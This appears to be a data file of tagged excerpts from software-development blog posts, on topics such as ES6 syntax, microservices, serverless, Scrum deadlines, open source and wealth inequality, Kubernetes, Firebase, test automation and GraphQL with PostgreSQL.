2428,"The below code shows what is template literals in ES6 compared to ES5We are using backtick character here. To add a placeholder in a template literal, we use the ${expression} syntax. You can replace expression with any Java Script expressions. Another benefit of using template literals is that they can expand multiple __url__ used the var keyword to define variables in ES5. The scope the var keyword is the entire enclosing function. Heres an example: Another issue with the var keyword is that if you use it at the top level outside of a function, it creates a property on the global object. ES6 introduced 2 new keywords for resolving these issues: let and const. Both these keywords define variables that are scoped to the containing block not function: With const we can define a constant. So we cannot reassign it later: Also let and const dont create a property on the global object if you use them at the top level: Heres a function expression in ES5: With arrow functions, we get rid of the function keyword and put a fat arrow (=>) between the parameters and the body of the function: If our function is a one-liner and returns a value, we can drop the return keyword as well as the curly braces: If our arrow function includes only a single parameter, we can even drop the parenthesis: If our arrow function doesnt have any parameters, then Arrow functions are particularly useful when you need to pass callback functions as arguments: Arrow functions, unlike normal functions, dont rebind this.","['JavaScript', 'ES6', 'Arrow Functions']",15
2429,"Now that we are familiar with how architecture evolved, we can now move on to the next section of my blog. All of the architecture mentioned above, from Mainframe architecture to CQRS data management, are all forms of monolithic architecture.structures an application as a single executable and deployable component. Monolithic architecture is actually a good choice in building simple applications, but there is an architecture that is better for large and complex systems which will be covered in a moment. Some of the benefits of building a monolithic-based application are as follows [1]: Simple to develop Easy to make radical changes Easy to scale Straightforward to test and deploy Since a monolithic-based application is a single component, we deliver, deploy, and test it easily in a straightforward manner. Once an application gets larger and even more complex, we face the following challenges [1]: Complexity Slow development Commit to deployment Difficulty in scaling Reliability Obsolete A large and complex monolithic-based application slows down the IDE of the developer which leads to development and deployment issues [1]. This type of application may experience difficulty in adopting new features and new technology. To address these challenges, Microservice Architecture is developed and introduced to the industry.structures the implementation view as a set of multiple components [1]. The implementation view are the things produced by the build system (JAR, WAR), while the components means the services, and these services are connected by communication protocols.","['Microservices', 'Software Architecture', 'Software Development']",10
2430,"When implementing a microservice-based application, you have to practice continuous delivery (such as Agile development) and deployment (such as Scrum deployment practices) [1]. [1] C. Richardson, Microservices Patterns with Examples in Java. New York: Manning Publications Co., 2019, pp.","['Microservices', 'Software Architecture', 'Software Development']",10
2431,"Java/Groovyrecommend Intelli J IDEA or Spring Tool Suite With appropriate Vim plugins installed, the developer experience is not bad but still not as smooth as with a full IDE. For occasional use, or for a person very familiar with Java who doesnt need much hand-holding by an IDE, this environment would be fine. (Note: Other JVM-based languages are okay, like Clojure, Kotlin, and Scala. )Lisp/Scheme/Racketrecommend Emacs/Slime for Lisp/Scheme, and Dr Racket for Racket Editing these languages is a pain with this tool stack. The command-line repls work well, but the developer experience with Vim is very poor. Plugins intended to help with parentheses make things worse. If you want to have a Lisp-like language available on this environment, I recommend Scheme with no Vim plugins added; it seemed to be the best of the three.","['Agile', 'Agile Transformation', 'Coding', 'Software Development', 'Scrum']",19
2432,"Android developmentrecommend Android Studio Vim aficionados say you can do development for the Android platform by using the Eclim plugin. One of the ways Eclim can work is to communicate with a headless instance of Eclipse, to tap into Eclipse features. Eclipse with an add-on called ADT used to be the standard way to develop Android apps. Apart from introducing overhead by having two development tools running in tandem, using Eclim with Vim creates a dependency on tooling that is being sunsetted. It also creates a fairly complicated stack comprising components not intended to be piled on top of each other in quite that way. In the end, if you can get this setup to work at all, the developer experience would be worse than Eclipse with ADT, and Eclipse with ADT is worse than Android Studio. Why go there?i OS developmentrecommend XCode on OSXPeople have tried and failed in myriad ways to configure Vim for i OS development. Those who are dead-set on using Vim should consider going the other way around: Use the Xvim plugin for XCode, instead of trying to add everything they need from XCode into Vim.","['Agile', 'Agile Transformation', 'Coding', 'Software Development', 'Scrum']",18
2433,"You are charged for the total number of requests across all your functions and usually you will enjoy a free tier. This brings great benefits from cost analysis point of view. However, IMHO it appears vendors are using this almost free service as a way to acquire new customers. Portability and migration costs of the functions, surrounding vendor services (e.g. API gateway, CDN, load balancers, etc.) and data need to be considered when performing a cost/benefit analysis.","['Serverless', 'Software Engineering', 'Software Development', 'Software Architecture', 'Cloud Computing']",11
2434,"Event driven architectures have been around for long time. Serverless is perfect fit for this type of architectures. Functions can also be used to extend capabilities of a basic offering using event-driven hooks. For instance, a function can be developed to process an OAuth authentication failure. The open closed principle ensures we have well-defined interfaces to be able to extend a solution without increasing the testing surface.","['Serverless', 'Software Engineering', 'Software Development', 'Software Architecture', 'Cloud Computing']",10
2435,"Each function can only access its own container space. If a function runtime gets compromised, it wont be able to access other functions (containers)Easier creation of new environments. Creation of new environments becomes easier when multiple streams of work are running in parallel since the creation of all components can be automated Support for polyglot teams. Functions can execute in Javascript, Python, Go, any JVM language (Java, Clojure, Scala, etc.","['Serverless', 'Software Engineering', 'Software Development', 'Software Architecture', 'Cloud Computing']",9
2436,"Imagine youre finally getting to take that vacation youve dreamed ofthree countries, seven cities, thousands of miles. Its everything you could want and more, right? How do you know what to eat, where to visit, how to experience what makes your destination truly unique? All the information youre looking for is on Airbnbsomewherethe question is, How do we surface the relevant parts of that information to you at the exact time youre looking for it? Discovering what you want and need to know about a destination is crucial to the overall trip experience, especially when traveling to a place youve never been to before. In order to surface relevant context to people, we need to have some way of representing relationships between distinct but related entities (think cities, activities, cuisines, etc.) on Airbnb to easily access important and relevant information about them. These types of information will become increasingly important as we move towards becoming an end-to-end travel platform as opposed to just a place for staying in homes. The knowledge graph is our solution to this need, giving us the technical scalability we need to power all of Airbnbs verticals and the flexibility to define abstract relationships.","['Search', 'Airbnb', 'Software Engineering', 'Data Science']",4
2437,"This forecasting in sprints generates multiple problems. In order to forecast the amount of work that can be completed, the team now needs to assess, for instance, the following factors: How much effort goes into each task? Is someone going to be on a personal leave during this time? Is everyone 100 percent committed to project-related work or are there some other responsibilities on the side? How many sick days are there going to be in the sprint? How many bugs is the team going to come across during the sprint? How difficult will they be to solve? Is someone leaving or joining the team? Are there any company events during the sprint? Are national holidays going to affect the sprint? Are there any hardware issues going to come up? While these assessments can be made easier with statistics: Generally, we get this much work done per sprint, and so forth. The bottom line is this: Theres a wide range of variables that cause the output to vary over different sprints.","['Agile', 'Deadlines', 'Programming', 'Project Management', 'Product Management']",1
2438,"Deadlines can have multiple effects on humans. Especially when they are closing in. Some of them include health risks such as increased stress, loss of brain cells, lessening creativity, digestion issues, headaches, etc. When deadlines are closing in, the human body may eventually feel threat to its survival and trigger the fight or flight response. (Source: Psychology Today, The Dark Side of Deadlines)Other effects include motivational enticement. There are studies that show deadlines can have a positive effect on work motivation. I would argue that there are other more worthwhile and less damaging motivational enticements in existence as well. Just to list a few to get you started: Creating an awesome product Delivering good quality Improving peoples lives Helping people with their problems Making people happy Deadlines can even undermine the motivation generated by other motivational enticements. (Source: Psychology Today, How deadlines can be murder on motivation)Additionally, the stress caused by deadlines sets up a vicious feedback loop and keeps a person dependent on deadlines like a caffeine junkie reaching for their morning cup of joe. For some people, meeting a deadline gives such an adrenaline rush that next time they may put off a task until they get physical symptoms of the fight or flight response. (Source: Psychology Today, The Dark Side of Deadlines)How many times have you heard these explanations before? We had to skip tests We had to add technical debt We could not fix the code We had to do it quickly We couldnt design it properly We had to take a shortcut Too often these sentences end withbecause we didnt have enough time. Theres probably multiple reasons, but in the end, it often comes back to deadlines, right? People will try to cut corners, produce lower quality and take risks while disregarding their own health to meet deadlines. (Source: ISHN, Deadlines can erode safety and promote risk-taking)As mentioned earlier, the variables often lead to unpredictability and the project ends up missing the deadline. So what can be done now? Cut corners (lowers quality)Work overtime Skip or forbid team other responsibilities like training Forbid personal leave Reduce the number of features Refine the feature scope Hire more team members Move the deadline Cutting corners usually ends up damaging product quality and generating loads of technical debt. This type of debt has a very high interest rate, and the project will have to pay it sooner or later. The worst case scenario is that it causes bugs in the production environment, which can be extremely costly.","['Agile', 'Deadlines', 'Programming', 'Project Management', 'Product Management']",4
2439,"Scrum as a popular agile framework enforce deadline-thinking in our day-to-day life in form of sprints. Teams end up working on sprints, with no sustainable tools to manage them. Some say a sprint forecast is not necessary, and a sprint should not be thought as a deadline. Im inclined to agree, but then again, I ask you this: Why have sprints in the first place? Sprints and time-boxing add a lot of artificial noise to a project. That noise has few major undesirable side-effects, the biggest ones being the possible health issues and unsustainable teams and projects. In the end, there are other ways to work (like Kanban) that do not have this noise and give more flexibility in return, too. Also while comparing Scrum and Kanban, they both can have the same predictability of the future after few months of working.","['Agile', 'Deadlines', 'Programming', 'Project Management', 'Product Management']",1
2440,"First, the good news, which is actually bad. In a 2016 survey from Blackduck, 96% of software products developed that year used open source software. That number is likely higher now. In the software world, particularly software that runs the computing infrastructure of the internet, open source is ubiquitous. One could claim, without any exaggeration, that our current world runs on open source software or that our modern world would not exist in its current form without open source software. I dont know how to calculate the total value of open source software to the world, but I do know that if open source software suddenly went away, the results would be catastrophic, an existential crisis for humanity. So when I write that open source has failed Im obviously not writing from a technology perspective, where it was been a clear-cut winner and the foundation of an endless supply of business models, products, and services. To say that open source contributed to the overall innovation of the world would be a shameful understatement. Better would be to say that the worlds computing innovations owe their existence to the triumph of open source development. If you think this all sounds pretty terrific, read on to find out what I left out.","['Open Source', 'Wealth Gap', 'Income Inequality', 'Intellectual Property']",16
2441,"Amusing sidebar: it is, in fact, only due to the sheer, abject stupidity of a not-insignificant number of technology executives and venture capitalists that open source software isnt even more successful. Youll still hear VCs repeat, with utmost sincerity, that releasing open source software cuts a startups valuation by 10%. It is only through luck that VCs have not been quicker to catch on to the strong connection between open source development and rapacious capitalism. I say that as someone who has built a career out of convincing companies to use open source platforms as a means of growing large ecosystems in order to establish and maintain hegemony over various industry segments. It is a testament to my terrible salesmanship that more companies havent followed my advice. In some technology circles, you will still get a whiff of open source is communist, which incites a bemused reaction from me. These are usually the same people who swear that nobody in their company uses open source, when in fact, all of their teams require it.","['Open Source', 'Wealth Gap', 'Income Inequality', 'Intellectual Property']",16
2442,"In the context of this essay, failure refers not to any technical achievements but rather to the lack of social ones. When we were but wee lads and lasses on the forefront of this thing we called free software and eventually open source, we knew that this was dangerous stuff. It was destined to set fire to an entire industry, undermining entrenched monopoly powers and establishing a more equitable approach to building wealth around the tools that would power humanity in the 21st century. It was about the democratization of software and would smash what we then called the digital divide. The crux of this essay is thus: not only did open source not stem or stall the redistribution of wealth and power upwards, but rather it aided and abetted the redistribution of wealth and power upwards. To be an open source proponent at this time without acknowledging this very real and most unfortunate consequence is to be a cog in a much larger machine; a stooge; a very useful idiot.","['Open Source', 'Wealth Gap', 'Income Inequality', 'Intellectual Property']",16
2443,"When considering the role of open source in redistributing wealth upwards, its instructive to consider the example of Microsoft. Not because I enjoy picking on them or think theyre evil I dont; Microsoft as a publicly traded company is no more or less evil than any other company. Rather, I like to single them out because their public stance towards open source has changed much over the years and is a useful measuring stick for the points Im trying to make. Did you ever wonder *why* their public stance towards open source shifted so much over the years, from Linux is a cancer to use our open source software? Could it be because, unlike the companys predecessors in 2000, current executives now understand that open source software forms the building blocks of modern capitalist behemoths? Consider the cases of these companies forming the base of what we now call big tech, all of which are darlings of wall street: Amazon, Google, Facebook, and yes, Microsoft. Well address the first 3 first, leaving Microsoft to the end, because its a special case. What do the 1st three have in common? They all built their entire business model on open source software, and they have paid very little in license fees to software vendors. They all applied the lesson very early on that the way you build profitable businesses is to start with a foundation of open source software, hire a team of smart engineers, and build your way to glory. And thats precisely what all of them have done.","['Open Source', 'Wealth Gap', 'Income Inequality', 'Intellectual Property']",16
2444,"Think about thatthe most successful way to amass ridiculous sums of money and keep it to yourself is to build your business on open source software. During the time in which large companies have amassed fortunes with open source software, the wealth gap has continued to widen, and fewer independent software developers are paid directly for their work. This statement is slightly controversial, because its quite easy for open source developers to find work, often high-paying. However, that work is often in the context of making products for your employer, which you do not own the intellectual property of. Employers love to pay expert open source developers, as long they give up their intellectual property claims. Most developers, open source and otherwise, are quite happy with this arrangement. After all, who cares what happens to 90% of the people if youre firmly ensconced within the top 10, 5, or even 1% of earners and never have to look for work again.","['Open Source', 'Wealth Gap', 'Income Inequality', 'Intellectual Property']",16
2445,"Which brings me to intellectual property law in general. The dream of open source software, as advanced by its advocates, was that democratization of software would result in shared ownership of its intellectual property. After all, if no one owns software, then everyone owns it. Unfortunately, this failed to take into account patent law and software. A developer may apply for a patentand get itbut the owner of that patent is the employer who paid the attorney to write the patent application. The company (employer) often owns the copyright and their developers write code under the employers copyright (not alwayssome companies are better than others). Employees have very few rights in these matters once they leave their employers, whether or not they write open source or proprietary software. Sure, they can cite their patents in the future, but that patent stays with their employer. This failure strikes at the very essence of open sources raison detre. If the proliferation of open source software cannot begin to resolve our issues with concentration of wealth in the technology industry, and in fact exacerbates it, then what good is it? One could argue that there is nothing intrinsically wrong with any of thisthat this is simply how markets work and is one of the consequences of a capitalist economy. If we lived in a time where extraordinary companies had difficulty putting distance between themselves and competitors, I would argue similarly. But in fact we live in a world where the polar opposite is true. A very few large companies have been able to establish concentrated bubbles of wealth and power that continue to grow at an astounding rate. These companies have learned how to use intellectual property laws to remove competitive threats and establish choke holds over their particular industry segments. This is alarming on many levels, but there are 2 that most concern me: 1. fat, lazy, wealthy companies dont really innovate very much and 2. high concentrations of wealth and power are breeding grounds of class resentment and divisive politics. #1 is largely theoretical at this point, but #2 has come true beyond any autocrats wildest dreams. That open source software has become a building block for #2 should give us all concern.","['Open Source', 'Wealth Gap', 'Income Inequality', 'Intellectual Property']",16
2446,"One of the most vocal proponents of intellectual property reform has been economist Dean Baker. He has argued forcefully that our current system of granting monopolies under patent law and other forms of intellectual property has directly resulted in the hoarding of wealth. Unfortunately, there has been a decided lack of enthusiasm by open source-friendly companies to tackle or confront our intellectual property laws. This is shameful, although one can understand whyits simply not in their financial interest to do so. (sidebar: why isnt Dean Baker on every open source conferences short list for keynotes? )Its time to understand something about open source software development: it is not going to save us. Using or developing more open source software is not going to improve anyones lives. Developing open source software is not a public good. Its not going to result in a fairer or more equitable society. In fact, as currently structured, open source development is part of the problem. If you work for one of the companies that stands in the way of intellectual property reform, and you say nothing in protest, then you are part of the problem. So many open source developers and advocates are gainfully employed and at very little risk of losing future work prospects, and yet I see so few speak out about their employers role in wealth inequality.","['Open Source', 'Wealth Gap', 'Income Inequality', 'Intellectual Property']",16
2447,"Its time to demand fairer markets as regulated by governments. Its time we demanded that our employers not contribute to the problem. Its time we considered that better regulations around open source usage and dissemination are probably a good thing, in so far as they can be designed to reduce wealth gaps and lead to more equitable societies. Reforming patent and copyright laws would be a good start. Reforming employee ownership of patents and intellectual property would be another. Mandating that web applications follow open source practices and allow more competition would be wonderful. Mandating that government agencies only use services that dont lead to further consolidation of wealth from proprietary services would be a feather in the cap. Until then, the proliferation of open source is synonymous with the further concentration of wealth and redistribution of wealth upwards. To ignore this is to engage in the most willful of ignorance that harms others. Once you come to the realization that you are part of the problem, as I have over the past few years, you must act to help resolve it. Contact your representatives and senators and start voicing opposition to those companies that are complicit. (If you like this essay, you should read my follow-up, Save Open Source, Save the World).","['Open Source', 'Wealth Gap', 'Income Inequality', 'Intellectual Property']",16
2448,"So the programmer has to now eliminate the ambiguity in order to convert this rule to code, or it will not run correctly. Heres a sampling of open questions: What is a User? What is the relationship between a User and a Profile? Who besides a User can edit? What besides a Profile can be edited? What do we do if we cant ensure this? Does this mean a rejected edit is by definition invalid? How is an invalid edit different from a edit? Is there such a thing as a valid edit and is it different from an edit? I could go on, but my point is even a seemingly simple rule defined in an ambiguous grammar like English explodes into 10X1000X more rules in an unambiguous one like Clojure. The programmer has to elicit and define all of them or risk causing severe bugs resulting in data corruption and crashes.","['Programming', 'Management', 'Systems Thinking', 'Scaling']",9
2449,"Now you might notice the uid field set under the owner References. UID is the identifier that is going to be unique across all the types of resources that you create. Kubernetes leverages this to actually create the Parent and Child relationship between various resources. To get this UID, you can use this command: Using this UID, we can easily relate the namespace to the database postgres object. Now lets recreate the namespace using: Let us list our resources to actually verify that they are all there:2. Observe the namespace enter the phase called termination: Yes, you heard that right, now postgres-namespace can be owned by more than one database object. Lets say this namespace is owned by postgres and postgres-1, then one thing to note here is that the postgres-namespace would only loose its scope and be garbage collected once both the database objects have been deleted. Also any one of the owner Reference should have to controller field set to true.","['Kubernetes', 'K8s', 'DevOps', 'Docker', 'Automation']",7
2450,"Lets create 2 database objects and then lets grep for the UID of those objects:2. Lets create the namespace with the new UIDs in the owner References (with postgres alone set with the controller field to true):3. Let us create the new namespace and list the namespace. Now when we delete the resources, we observe that the namespace entering the phase termination.4. Let us try something differently, let us create 2 database objects. Ive reused the manifest used above and have only replaced the uid fields in the owner Reference.","['Kubernetes', 'K8s', 'DevOps', 'Docker', 'Automation']",18
2451,"So what do we do here? Maybe But it might be an error which will never be fixed (see: Permanent Failures). So actually in this case, the system doesnt know what to do, and neither do we. Therefore some human intervention is required! In this case we can use an unknown errors step to notify the appropriate people that we need to take action on a users subscription. Once we understand the problem, we can update the service and handle that error within the system correctly.","['AWS', 'Step Functions', 'Lambda']",13
2452,"When you go to create a Firebase project, this fact is mostly hidden. To get started with Firebase, its simply not necessary to know anything about GCP. The onboarding path is optimized to get you to a working solution with minimal effort. I know that many developers appreciate this! Heres a screenshot of the Firebase console after youve created a new project: You can see a scrollable list of products on the left, organized by top-level categories that expand and collapse. In the middle, you have some buttons that help you get started adding your app to the project. Its pretty clear what youre expected to do next. Later, after you add an app and start using some of the products, the main area changes into a dashboard that shows you some stats on the products you use.","['Google Cloud Platform', 'Firebase', 'Cloud', 'Software Development', 'Cloud Services']",18
2453,"In some cases, the Firebase console actually delegates to the Cloud console in order to handle some common tasks, such as billing management and administrative user management (known as Identity and Access Management, or IAM in the Cloud console). So if youre working with the Firebase console, then somehow click through to something with a blue and white UI theme, youve just been sent to the Cloud console. Same project, different console and UI. Heres what it looks like if you try to click on a billing account from the Firebase console. Its definitely the Cloud console, even if it says Firebase at the top: Theres one super-important thing to know about these project containers. Since the underlying project is the same for both Firebase and GCP, if you delete the project using either Firebase or the Cloud console, you will delete everything in that container, no matter where it was configured or created. So, if you created a project with the Cloud console, then add Firebase to it, then delete the project in the Firebase console, all your Cloud data will also be deleted.","['Google Cloud Platform', 'Firebase', 'Cloud', 'Software Development', 'Cloud Services']",7
2454,"If youre wondering what exactly I mean by APIs and services, this is a GCP concept thats only visible in the Cloud console. Heres a screenshot of the APIs and services dashboard from the Cloud console after Firebase has been added to a project: Here, you can see a number of APIs (enabled by default), along with some Firebase product APIs highlighted in the red box. This detail of enabled APIs is hidden from developers in the Firebase console, because its not really necessary to know. However, knowledge of GCP APIs and services gains importance as an apps backend becomes more sophisticated. For example, an app developer might want to make use of the Cloud Vision API to extract text from images captured by the device camera. And then, go further and translate the text discovered in that image using the Cloud Translation API. To use these APIs (and get billed for them), you have to enable them in the Cloud console. Once enabled, you can call them from your backend code (deployed to Cloud Functions, for example).","['Google Cloud Platform', 'Firebase', 'Cloud', 'Software Development', 'Cloud Services']",11
2455,"In a monolith there is one place where the property files are stored and when changes are needed, there is only one place that they need to be updated. In a microservice architecture, each microservice owns its own properties. This can result in duplication of a single property value across multiple microservices. If that value needs to be updated it will need to be changed in every microservice. This isnt a big deal if you only have one or two microservices, but if that property is used in 10, 20, or 30 different ones you will have to make the change in each one and re-deploy it for the change to take effect. Luckily, Spring Cloud offers an easy way to combine all the properties for all of your microservices into one place.","['Java', 'Microservices', 'Spring Boot', 'Spring', 'Software Development']",18
2456,"The default properties style uses a file extension of.properties but I have chosen to use __url__ extension instead. You can choose to use whichever you prefer in your own implementation. For our basic configuration of the Config Server we will need to set only five properties. The first is the application name. In this case we will call it config-service but this is not essential for the application to run, just a good practice. The next is the port that the Config Server will run on. The most important property is the git uri of the Git repo that we created up above. For the time being, we will use a local file version of the Git repo. Set property __url__ to point to the git repository that we created earlier. Spring Cloud Config Server also allows us to customize the search paths that are used when making a request to the server. Since we set up our git repo to have a folder for each application, we need to specify how the server should search for properties. Using the '{application}' value for search-paths we can tell the server to look inside the directory that corresponds to the name of the application that is calling it. Here is what our finished property file should look like.","['Java', 'Microservices', 'Spring Boot', 'Spring', 'Software Development']",7
2457,"There are two reasons for testing: Testing enables change Tests describe the behavior of the system The ultimate test automation goal is to ship faster and more often, with no bugs. Nobody wants their release delayed because the test cycle took too long. Shipping the software without first validating that its acceptance criteria have been met is a bad idea. When software is being refactored, automation can require a lot of maintenance. Building and maintaining the tests can be too expensive in some cases. Keep this in mind when you decide how to implement your automation.","['Software Development', 'Test Automation', 'Unit Testing', 'Testing', 'Regression Testing']",13
2458,"Here are five things to consider when determining your testing method combination: TRUST: Is the test trustworthy? COST: How much will it cost to build and maintain these tests? SPEED: Do the tests run fast? RELIABILITY: Are each of the tests reliable? TARGETED: Will the test(s) point you in the right direction? Can you trust the test to tell you if the system is broken (preferably functionally)? Or, if the test fails, what requirement is not met anymore? Is that block of code still relevant when the functional needs of the system change? Will this test help me decide if the test is wrong and needs to be removed or changed? Or will it show me if its the system thats flawed, and that I need to fix a bug there instead? Why would I automate tests if it slows me down? How many tests of this type are needed to cover all the test cases? And what are the costs of changing them when the software changes? Time spent building the test * amount of tests + times changed * cost of change = good or bad idea.","['Software Development', 'Test Automation', 'Unit Testing', 'Testing', 'Regression Testing']",13
2459,"Different testing methods can be applied to different testing levels. Here are five common ones: Unit testing can be applied when testing small pieces of code. So, for example, if you were baking a pie, a unit might refer to the sugar. Its one functional piece of code which is meaningless outside the context. You could, for example, test if the white powder youre about to add to your pie is actually sugar by testing if it is sweet or not. A unit can (and should) be tested, but that test wont guarantee apple pie. This test will provide documentation on a granular level which will probably be useful to the developer, but meaningless to the product owner.","['Software Development', 'Test Automation', 'Unit Testing', 'Testing', 'Regression Testing']",13
2460,"So, lets continue with our pie metaphor. Youve tested the sugar, the apples, the butter, the flour, and the eggs. Will all these ingredients result in a pie after theyve been stirred and baked? And does it taste like apple pie? This kind of testing doesnt care about what type of butter or dough you used. It only tests the business value.","['Software Development', 'Test Automation', 'Unit Testing', 'Testing', 'Regression Testing']",13
2461,"No flowchart dictates which tests to implement in a given situation. It takes time and practice to get it right. The right combination of automation tests will run fast, test behavior, and allow for refactoring. It will provide targeted feedback for a faster response time. To determine your automation testing approach, analyze every situation and identify the challenges you need to address. By keeping these test automation best practices in mind, your software releases can be easy as pie!","['Software Development', 'Test Automation', 'Unit Testing', 'Testing', 'Regression Testing']",13
2462,"Most of the tools available are open-source, can evaluate the source code and/or bytecode and be installed as a plugin in Eclipse IDE. Others are paid apps, with trial versions. Below, we have a list of most popular tools on the market and come from academic work in Software Engineering: Metrics: is the oldest of this list. With the first implementations made available in the early 2000s, Metrics is a plugin for Eclipse that analyzes Java code. Calculates the value of 23 metrics at class and project level, with mean and standard deviation, and has a cyclic dependency analyzer between packages. The authors inspiration for the implementation of the metrics were: Object-Oriented Metrics, measures of Complexity, a book written by Brian Henderson-Sellers (1996); and the article OO Design Quality Metrics, An Analysis of Dependencies (1994), and Agile Software Development, Principles, Patterns and Practices (2002), both by Robert C. Martin (a.k.a Uncle Bob).","['Software Development', 'Clean Code', 'Metrics', 'Quality', 'Tools']",9
2463,"These conventions are defined in files or guides known as profiles that can be imported into IDEs such as Eclipse, Netbeans, or Intelli J. Each of these IDE already has its default Style Guide. If you want to use a specific style guide, you can import it into your IDE. One of the most used external style guides for devs is the Google Java Style Guide. If you want to customize a style guide, we can create a profile by going to Window -> Preferences -> Java -> Code Style -> Formatter. So, every time we use the Ctrl + Shift + F command in the class, the code is formatted following the settings made by your own.","['Software Development', 'Clean Code', 'Metrics', 'Quality', 'Tools']",19
2464,"Among the most popular tools in this category is Checkstyle. In this tool are checked the method declarations order, standard nomenclature, the position of the default clause in switch statements, among others. However, it should be noted that these violations of style rules are not always necessarily mistakes. However, they can be important to avoid problems of file format conflicts during merges and surpluses of life They are structural quality checkers of the code. Linters help identifies and fixes problems without having to run the application. The tools of this category are to report the problems found based on the level of severity and describing what the problem is about.","['Software Development', 'Clean Code', 'Metrics', 'Quality', 'Tools']",9
2465,"Sonar Lint: from this list of linters (and also from SCAT), Sonar is undoubtedly the most complete tool available. In its Lint version, it has several functionalities very useful for your day-to-day, which other tools do not have. For example, in On-the-fly analysis, it shows the problems as you code. Underline the new issues so that you can still focus on the code being written. In the On changes analysis, the problems encountered are listed in all files that you have added and updated. In summary, with Sonar Qube + Lint is the most accurate combo in errors and technical debt identifications your project. In addition, it has integration with the IDEs such as Eclipse, Visual Studio, VS Code, Atom, and Intelli J.","['Software Development', 'Clean Code', 'Metrics', 'Quality', 'Tools']",15
2466,"Inside the project proposal, we importantly made no specific promises; instead, we presented tangible problems and measurable outcomes, which after six months we have now partially achieved. Those include: Increased test coverage (our code coverage was less than 50% and more alarmingly, 45 of our 81 files had 0% coverage. )Fewer regressions (weve noticed every Java Script regression and the majority have not been related to our refactor project)Code built with modern tooling (all our Java Script code is now built via Webpack which has made it much easier to work with)Possible performance improvements (so far weve not seen any change here but we see the potential for change)More reusable standardized components (weve started making headway on this! )And less measurable (but hopefully outcomes that could later be recognized): Quicker on-boarding of new hires Quicker development cycles and estimations for product work More future proof code Essentially, for a project with limited time and resources (Wikipedias mobile site is maintained by a team of just 6 paid people), we pitched a refactor not a rewrite. Rather than replacing a complicated system, we would slowly and iteratively improve it. This was important as it promised iterative development while keeping the site up and running (and improving at all times). While this slowed down development it kept our work visible and kept us accountable to our product team, meaning it was impossible for our development team to hold our product owners hostage by telling them we couldnt build new things until the refactor had completed. It also allowed us to work on new products in parallel to this important work (we shipped several projects during this time) as well as guaranteeing that we would achieve something! If you are interested, there is a technical write up of what we have done and what we have achieved so far on our internal blog: Migrating code from Resource Loader to Webpack.","['Software Development', 'Technical Debt', 'Communication']",10
2467,"One unexpected output of our work, which I wrote about recently, was exposing Java Script errors. Before we began, the rewrite had us a little nervous and our infrastructure is lacking a system for capturing Java Script errors. Thanks to being a problem-focused project, we had the flexibility to incorporate this into the project. After some discussion, we decided to build the smallest possible thing we could using existing infrastructurea client-side error counter. While not ideal and not allowing us to understand what the errors were, this allowed us to get a sense of whether changes to the site are introducing bugs to users and provides us with a lovely graph to monitor with motivating numbers. It also gave us data for a future technical project to pitch to our product team (I cant wait for our next offsite)! In addition to this, while weve been forced to look at the code, weve been noticing ways to improve it and prepare it for a modern future. For instance, weve been reducing our reliance on j Query. While were not removing j Query from our stack just yet, weve found inspiration in other efforts to do this such as Github to at least make this a real possibility.","['Software Development', 'Technical Debt', 'Communication']",6
2468,"I deployed my application and exposed port 8080: And I visited the application home page. It successfully decrypted the secret word! Method 1 is nice, but it only works when my app is running on GKE. How could I install Google Cloud service account credentials on Kubernetes nodes running elsewhere? Fortunately, all Google Client API libraries inspect the environment variable GOOGLE_APPLICATION_CREDENTIALS. The environment variable GOOGLE_APPLICATION_CREDENTIALS stores a path to a service account key, so the first thing I needed was a service account key. I created the service account key with gcloud: Its tempting to pack the key into the Docker image, but this would be very insecure. Everyone with permission to read the Docker image would be able to decrypt appsecrets.json.encrypted.","['Google Cloud Platform', 'Kubernetes', 'Aspnetcore', 'Encryption']",7
2469,"In the Dockerfile for your container, add the following line to copy this file into the primary user (usually root) directory in your Docker container: There is, however, one gotcha. In Alpine Linux (and possibly others) the default shell is not a login shell, which means.profile will not be executed when the container is accessed using something like docker exec -it container /bin/sh. To fix this, also add the following to the same Dockerfile: Django gets its environmental variables from the application server it is running in, so we need uwsgi to also read environment.txt. Add the following to your __url__ file: The final part of this solution is allowing the Django project to also access these variables. Add the following to the top of your Django projects __url__ file:*UPDATE 20190223*So I realised that for boolean variable my original approach would not work properly. If you have DEBUG=False in your __url__ file, the result of get_env_variable('DEBUG') will be 'False' (a string value) as opposed to False (a boolean value). In Python, a variable set to a string value will eval to True, which is not what we want.","['Docker', 'Uwsgi', 'Django', 'Software Development', 'DevOps']",7
2470,"At Yipee.io, we recently added team functionality to our modeling tool. Teams provide support for sharing applications and are tied into our pricing, enabling teams to purchase different plans with different sets of associated features and increasing complexity for us. We agreed on the relationships between users, teams, plans and features but it wasnt necessarily clear up front exactly how the UI would need to navigate the relationships. We might want to find the features defined for a user but, alternatively, we might want to find all users, teams1, and plans that possess a particular feature. At the time, for historical reasons, we had a backend system driven by REST APIs that stored data in Mongo DB. Mongo DB is an excellent choice for certain use cases (particularly very high data volumes) but a complicated graph of relations, which can be navigated from multiple endpoints along a wide variety of paths, is not a particularly good fit. We decided to switch our backend to a relational database as we didnt anticipate ever reaching a volume of data that would make a relational implementation problematic. Now that multiple vendors support RDBMS as a service, the decision to use a relational database has been made even easier. Having had positive experiences with Postgre SQL in the past, we decided to give it a try. Our Daa S vendor supported Postgre SQL in addition to Mongo DB, so the switch could be made fairly easily. As it turned out, Postgre SQL was quite possibly the ideal choice for this application. Ill discuss its unique qualifications later in the post. Once we had decided on a relational database, a similar thought process ensued around our REST APIs. The document model behind REST is a somewhat poor fit to a relationship graph with properties on the associations. The model we were managing looked like: We could have mapped out REST endpoints for our immediate operational needs, but we might easily have been chasing use cases for some time as the UI or another API user needed different collections of data. An initial dataset for a user identity needed by the UI was: The users id, terms and features Each org1 containing the user with its id, name, owner (with id and identity), set of users (with id and identity), set of admins (with id and identity), set of writers (with id and identity), plan elements (with id and name), set of features (with id and name) and the set of features for the plan (with id and name)The backend API needed a similar but somewhat different dataset to establish a user context. These sorts of queries make for an odd REST interface. So we decided to move away from REST for our team model and use Graph QL. The rest of this discussion will talk about our experience using Graph QL with Postgre SQL to implement our team model. 1*Teams are called orgs in the schema since there are orgs for individuals and we wanted to talk about true team plans separately. Single-person orgs work just like orgs associated with larger teams. *There are many excellent sources for information about Graph QL online. In particular, this site has a wealth of useful material. That said, Ill give a brief overview here for context. Graph QL is an alternative to REST that allows clients to design their own queries instead of requiring that all requests be defined by the server. This works because Graph QL is schema-based. A Graph QL server defines:a schema which specifies all the meaningful relationships between the elements of a data modela set of queries which are entry points into the schema for retrieving dataa set of mutations which are the operations that may be performed on model data Unlike a REST api, a query entry point does not itself define 